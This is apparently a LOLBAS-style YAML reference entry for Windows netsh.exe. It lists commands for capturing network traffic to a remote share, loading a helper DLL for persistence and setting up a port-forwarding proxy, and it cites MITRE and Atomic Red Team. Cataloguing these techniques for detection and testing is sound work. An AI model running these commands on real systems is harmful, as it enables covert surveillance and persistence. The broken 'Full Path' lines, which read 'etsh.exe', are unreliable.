---
Name: Netsh.exe
Description: Execute, Surveillance
Author: ''
Created: '2018-05-25'
Categories: []
Commands:
  - Command: |
          netsh.exe trace start capture=yes filemode=append persistent=yes tracefile=\\server\share\file.etl
          netsh.exe trace show status
          netsh.exe add helper C:\Path\file.dll
          netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8000 connectaddress=192.168.1.1
    Description: ''
Full Path:
  - C:\Windows\System32
etsh.exe
  - C:\Windows\SysWOW64
etsh.exe
Code Sample: []
Detection: []
Resources:
  - https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Persistence/Netsh_Helper_DLL.md
  - https://attack.mitre.org/wiki/Technique/T1128
  - https://twitter.com/teemuluotio/status/990532938952527873
Notes: ''
---